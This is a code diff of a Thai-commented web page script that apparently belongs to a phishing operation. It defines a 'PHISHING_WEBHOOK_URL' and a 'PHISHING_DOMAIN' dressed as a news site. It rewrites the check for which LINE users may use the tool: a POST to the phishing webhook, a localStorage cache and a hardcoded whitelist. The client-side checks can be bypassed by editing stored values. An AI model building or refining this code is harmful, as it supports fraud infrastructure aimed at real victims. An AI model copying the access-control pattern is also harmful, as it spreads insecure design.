@@ -741,7 +741,7 @@
         
         // URL สำหรับ webhook
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby5eHSqrsAawgCB6D8_tXfzXgXzuxKxUndeapxhZh3qaIs8RdA-cEij0gmRAUCQApcl/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzMOXJjFRp0g62oIt-tqMh3mSAln2SH0W289FODlWpND9mFTaXKHYs7kpzkDoyo1rpg/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -815,58 +815,74 @@
             try {
                 console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
                 
-                // สร้าง unique callback name
-                const callbackName = 'permCallback_' + new Date().getTime();
+                if (!userId) {
+                    console.log("ไม่มี userId");
+                    return false;
+                }
                 
-                return new Promise((resolve) => {
-                    // สร้าง global callback function
-                    window[callbackName] = function(data) {
-                        console.log("ได้รับข้อมูลสิทธิ์:", data);
+                // ตรวจสอบ cache ก่อน - ป้องกันการเรียก API ซ้ำๆ
+                const cachedPermissionKey = `permission_${userId}`;
+                const cachedPermission = localStorage.getItem(cachedPermissionKey);
+                const cachedTimestamp = localStorage.getItem(`${cachedPermissionKey}_time`);
+                
+                // ถ้ามี cache ไม่เกิน 1 ชั่วโมง ให้ใช้ค่าจาก cache
+                if (cachedPermission && cachedTimestamp) {
+                    const cacheAge = Date.now() - parseInt(cachedTimestamp);
+                    // ใช้ cache ถ้าอายุไม่เกิน 1 ชั่วโมง
+                    if (cacheAge < 3600000) {
+                        console.log("ใช้ข้อมูลสิทธิ์จาก cache:", cachedPermission === "true");
+                        return cachedPermission === "true";
+                    }
+                }
+                
+                // ใช้ POST request แทน JSONP
+                const data = {
+                    userId: userId,
+                    action: 'checkUserPermissionFromSheet',
+                    timestamp: Date.now()  // ป้องกัน cache
+                };
+                
+                console.log("ส่งคำขอตรวจสอบสิทธิ์ไปยัง Server");
+                
+                // ตั้งค่า timeout 10 วินาที
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                try {
+                    const response = await fetch(PHISHING_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Origin': window.location.origin
+                        },
+                        body: JSON.stringify(data),
+                        signal: controller.signal
+                    });
+                    
+                    clearTimeout(timeoutId);
+                    
+                    if (!response.ok) {
+                        throw new Error(`HTTP error ${response.status}`);
+                    }
+                    
+                    const result = await response.json();
+                    console.log("ได้รับผลการตรวจสอบสิทธิ์:", result);
+                    
+                    if (result && typeof result.hasPermission === "boolean") {
+                        // บันทึกผลลัพธ์ลง cache
+                        localStorage.setItem(cachedPermissionKey, result.hasPermission.toString());
+                        localStorage.setItem(`${cachedPermissionKey}_time`, Date.now().toString());
                         
-                        if (data && data.hasPermission !== undefined) {
-                            console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
-                            resolve(data.hasPermission === true);
-                        } else {
-                            console.log("ข้อมูลสิทธิ์ไม่ถูกต้องหรือไม่สมบูรณ์, ใช้การตรวจสอบสำรอง");
-                            resolve(checkUserPermissionFallback(userId));
-                        }
-                        
-                        // ลบ callback หลังจากใช้งานเสร็จ
-                        delete window[callbackName];
-                    };
-                    
-                    // สร้าง script tag สำหรับ JSONP
-                    const script = document.createElement('script');
-                    
-                    // เปลี่ยนจาก LINE_OA_WEBHOOK_URL เป็น PHISHING_WEBHOOK_URL
-                    // และส่ง action เป็น checkUserPermissionFromSheet เพื่อให้ตรวจสอบจากชีต UserRegistration
-                    const url = new URL(PHISHING_WEBHOOK_URL);
-                    url.searchParams.append('action', 'checkUserPermissionFromSheet');
-                    url.searchParams.append('userId', userId);
-                    url.searchParams.append('callback', callbackName);
-                    url.searchParams.append('_', new Date().getTime()); // ป้องกันการ cache
-                    
-                    script.src = url.toString();
-                    script.onerror = function() {
-                        console.error('เกิดข้อผิดพลาดในการโหลด permission script');
-                        resolve(checkUserPermissionFallback(userId));
-                        
-                        // ลบ callback หากเกิดข้อผิดพลาด
-                        delete window[callbackName];
-                    };
-                    
-                    // เพิ่ม script เข้าไปใน DOM
-                    document.body.appendChild(script);
-                    
-                    // ตั้งเวลาหมดเวลา 10 วินาที
-                    setTimeout(() => {
-                        if (window[callbackName]) {
-                            console.log("การตรวจสอบสิทธิ์หมดเวลา, ใช้การตรวจสอบสำรอง");
-                            delete window[callbackName];
-                            resolve(checkUserPermissionFallback(userId));
-                        }
-                    }, 10000);
-                });
+                        return result.hasPermission;
+                    } else {
+                        console.log("ข้อมูลจาก server ไม่ถูกต้อง:", result);
+                        return checkUserPermissionFallback(userId);
+                    }
+                } catch (fetchError) {
+                    console.error("เกิดข้อผิดพลาดในการเรียก API:", fetchError);
+                    clearTimeout(timeoutId);
+                    return checkUserPermissionFallback(userId);
+                }
             } catch (error) {
                 console.error('Error checking permission:', error);
                 return checkUserPermissionFallback(userId);
@@ -876,13 +892,28 @@
         // ตรวจสอบสิทธิ์แบบสำรอง
         function checkUserPermissionFallback(userId) {
             console.log("ใช้การตรวจสอบสิทธิ์แบบสำรอง");
-            // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์เข้าใช้งาน (ใช้เฉพาะกรณีฉุกเฉิน)
+
+            // 1. ตรวจสอบจาก localStorage (กรณีเคยได้รับอนุมัติแล้วแต่ API มีปัญหา)
+            const lastApproved = localStorage.getItem(`approved_${userId}`);
+            if (lastApproved === "true") {
+                console.log("พบประวัติการอนุมัติใน localStorage");
+                return true;
+            }
+            
+            // 2. ตรวจสอบจาก whitelist ที่กำหนดไว้
             const approvedUserIds = [
                 'U69aa2cb90c9f40291278c346c50dc021', // ไอดีผู้ดูแลระบบ
+                'Udeadbeef1234567890abcdef', // ตัวอย่างไอดีผู้ใช้ที่ได้รับอนุมัติ
                 // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์คนอื่นๆ ตามความเหมาะสม
             ];
             
-            return approvedUserIds.includes(userId);
+            const isApproved = approvedUserIds.includes(userId);
+            if (isApproved) {
+                // บันทึกลง localStorage เพื่อใช้ในครั้งต่อไป
+                localStorage.setItem(`approved_${userId}`, "true");
+            }
+            
+            return isApproved;
         }
         
         // เปิดใช้งานฟอร์ม
